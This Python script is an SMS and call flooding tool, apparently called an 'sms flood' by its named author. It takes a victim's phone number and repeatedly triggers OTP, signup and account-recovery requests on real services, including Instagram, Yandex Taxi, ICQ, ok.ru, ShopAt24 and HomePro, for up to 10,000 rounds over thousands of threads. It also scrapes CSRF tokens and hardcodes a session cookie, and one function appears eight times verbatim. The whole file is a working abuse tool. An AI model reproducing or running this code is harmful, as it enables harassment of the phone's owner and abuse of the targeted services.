from requests import Session,post,get
from re import search
from concurrent.futures import ThreadPoolExecutor 
from time import sleep

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")
        
"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ShopAt24 | sent")
    else : 
        print("[*] ShopAt24 | fail")

"""api sms pizza1112"""
def p1112(phone):
    d=post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
    if d == 200:
        print("[*] 1112 | sent")
    else : 
        print("[*] 1112 | fail")

"""api sms pizza1112 v2"""
def p1112v2(phone):
    d=post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
    if d == 200:
        print("[*] 1112 | sent")
    else : 
        print("[*] 1112 | fail")

"""api call okru"""
def okru(phone):
    s=Session()
    s.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
    print("[*] okru | sent")

"""api call findclone"""
def findclone(phone):
    d=get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
    if d.get("Error",False) == "Wait for timeout":
        print("[*] findclone | fail")
    else :
        print("[*] findclone | sent")

"""api sms unacademy"""
def unacademy(phone):
    d=post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers=headers).json()
    if d.get("error_code",False):
        print("[*] unacademy | fail")
    else :
        print("[*] unacademy | sent")

"""api sms icq"""
def icq(phone):
   post(f"https://u.icq.net/api/v4/rapi",json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},headers=headers)
   print("[*] icq | sent")

""" get instagram token"""
def ig_token():
    d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
    d=search("csrftoken=(.*);",d).group(1).split(";")
    return d[0],d[10].replace(" Secure, ig_did=","")

"""api sms instagram"""
def instagram(phone):
    token,_=ig_token()
    d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
    if d["status"] == "ok":
        print("[*] instagram | sent")
    else:
        print("[*] instagram | fail")

"""api sms instagram v2"""
def instagramv2(phone):
    token,cid=ig_token()
    d=post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
    if d["status"] == "ok":
        print("[*] instagram v2 | sent")
    else:
        print("[*] instagram v2 | fail")

"""api sms yandex"""
def yandex(phone):
    d=post("https://taxi.yandex.kz/3.0/launch/",json={},headers=headers).json()
    d=post("https://taxi.yandex.kz/3.0/auth/",json={"id": d["id"], "phone": f"+66{phone[1:]}"},headers=headers).text
    if d == "{}":
        print("[*] yandex | sent")
    else:
        print("[*] yandex | fail")

"""api sms homepro"""
def homepro(phone):
    d=post("https://www.homepro.co.th/service/user/profile/otp.jsp",data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"}).json()
    if d["msgtype"] == "success":
        print("[*] homepro | sent")
    else:
        print("[*] homepro | fail")

"""loop func """
def loop(pho):
    for _ in range(2):
        exec.submit(okru,pho) # call
        exec.submit(findclone,pho) # call
        exec.submit(unacademy,pho) # sms
        exec.submit(icq,pho) # sms
        exec.submit(instagram,pho) # sms
        exec.submit(instagramv2,pho) # sms
        exec.submit(yandex,pho) # sms
        sleep(10)

if __name__ == "__main__":
    exec=ThreadPoolExecutor(max_workers=10000)
    print("[*] sms flood 11 api by ปิยะวัฒน์ ทวคำ")
    pho = input("[!] phone number >> ")
    i = int(input("[!] amount sms (max. 10,000) >> "))
    exec.submit(loop,pho)
    for _ in range(i):
        exec.submit(shopat,pho) # sms
        exec.submit(p1112,pho) # sms
        exec.submit(p1112v2,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms
        exec.submit(homepro,pho) # sms